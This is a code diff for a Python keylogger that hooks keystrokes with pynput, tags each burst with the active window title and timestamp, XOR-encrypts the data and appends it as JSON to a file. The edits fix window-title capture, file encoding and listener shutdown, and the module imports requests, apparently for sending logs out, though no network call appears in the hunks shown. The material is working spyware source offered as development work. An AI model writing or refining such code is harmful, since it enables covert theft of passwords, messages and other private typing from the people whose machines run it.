@@ -1,8 +1,6 @@
 from abc import ABC, abstractmethod
 from pynput.keyboard import Listener
-from typing import List
-import time,json,random,string,ToolBox,threading,pywinctl,requests
-
+import time,json,random,string,ToolBox,threading,pygetwindow,requests
 
 class IKeyLogger(ABC):
     @abstractmethod
@@ -39,10 +37,10 @@ class KeyLoggerService(IKeyLogger):
         key = ToolBox.format_key(key)
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
-        active_window = pywinctl.getActiveWindow()
+        active_window = pygetwindow.getActiveWindowTitle()
 
         if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
-            self.__last_record = active_window.title + ': ' + current_time_formatted
+            self.__last_record = active_window + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
         self.__last_window = active_window
@@ -63,11 +61,11 @@ class KeyLoggerService(IKeyLogger):
 
 class FileWriter(Write):
     def __init__(self,path=None):
-        self.path = path or r""
+        self.path = ToolBox.get_file_path()
 
     def write(self, data:dict[str:str]) -> bool:
         try:
-            with open(self.path,"a") as file:
+            with open(self.path,"a",encoding='utf-8') as file:
                 convert_data = json.dumps(data)
                 file.write(convert_data)
                 return True
@@ -92,8 +90,8 @@ class Encryptor:
     def encrypt(self,data:str) -> str:
         ciphertext = ""
         length_key = len(self.key)
-        for i in range(len(data)):
-            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
+        for index in range(len(data)):
+            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
         return ciphertext
 
 class KeyLoggerManager:
@@ -111,10 +109,13 @@ class KeyLoggerManager:
 
     def stop_logging(self):
         self.__is_logging = False
+        self.listener.stop()
 
     def __listen(self):
-        with Listener(on_press=self.__key_logger.on_press) as listener:
-            listener.join()
+        with Listener(on_press=self.__key_logger.on_press) as self.listener:
+            self.listener.join()
+
+
 
     def print_keys(self):
         logged_keys = self.__key_logger.get_logged_keys()
@@ -125,9 +126,11 @@ class KeyLoggerManager:
 
 x = KeyLoggerManager()
 x.start_logging()
-while True:
-    # time.sleep(1)
+for i in range(3):
+    time.sleep(8)
+
     x.print_keys()
+x.stop_logging()
 
 
 
